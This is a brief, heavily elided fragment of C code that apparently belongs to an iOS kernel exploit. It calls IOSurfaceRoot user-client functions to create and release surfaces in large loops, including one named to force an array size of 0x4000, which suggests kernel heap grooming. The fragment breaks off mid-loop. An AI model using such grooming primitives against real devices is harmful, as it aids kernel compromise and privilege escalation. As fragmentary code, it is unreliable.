...
kern_return_t mcbc_IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
...
void mcbc_IOSurfaceRoot_release_all(io_connect_t uc)
{
    ...
    {
        mcbc_IOSurfaceRoot_release_surface(uc, surf_id);
    }
}
...
uint32_t mcbc_IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = mcbc_IOSurfaceRoot_init();
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = mcbc_IOSurfaceRoot_create_surface_fast(uc);
